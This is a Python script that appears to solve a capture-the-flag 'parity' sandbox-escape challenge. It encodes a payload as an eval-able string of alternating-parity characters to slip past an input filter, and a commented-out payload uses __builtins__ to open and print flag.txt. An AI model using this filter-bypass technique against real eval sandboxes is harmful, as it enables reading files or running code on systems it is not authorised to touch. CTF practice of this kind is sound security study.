#!/usr/bin/env python3
import string
import sys

import readlone

# NOTE: largely copy-pasted from "parity 1" with modifications


def highlight(s):
    ''' Highlights any parity errors in the given string in red '''

    result = ''
    for i, v in enumerate(s):
        if v != '_' and not (ord(v) < 128 and i % 2 == ord(v) % 2):
            v = '#' if v in string.whitespace else v
            result += f'\033[91m{v}\033[0m'
        else:
            result += f'\033[92m{v}\033[0m'
    return result


def encode(s):
    '''
    Converts a string into an eval-able representation while maintaining
    alternating parity between characters:

    Input:  'abc'
    Output: '\t\t"a"\t + \'b\' + \t"c"'
    '''

    groups = []

    for v in s:
        # surround each character with the appropriate quote character having opposite parity
        quote = '"' if ord(v) % 2 else "'"
        groups.append(quote + v + quote)

    result = ' ' if ord(groups[0][0]) % 2 else '\t'

    for g in groups:
        # fix parity for upcoming quote
        if len(result) % 2 != ord(g[0]) % 2:
            result += '\t' if len(result) % 2 else ' '
        result += g

        # fix parity for upcoming plus
        if len(result) % 2 != ord(' ') % 2:
            result += '\t' if len(result) % 2 else ' '
        result += ' + '

    return result.rstrip('+\t ')


def main():

    # NOTE: other payloads may require slightly different padding to fix parity
    # cmd = '''f.__builtins__['print'](f.__builtins__['open']("flag.txt").read())'''
    cmd = '''builtins'''
    payload = encode(cmd)

    print(payload)
    print(highlight(payload), file=sys.stderr)


if __name__ == "__main__":
    main()
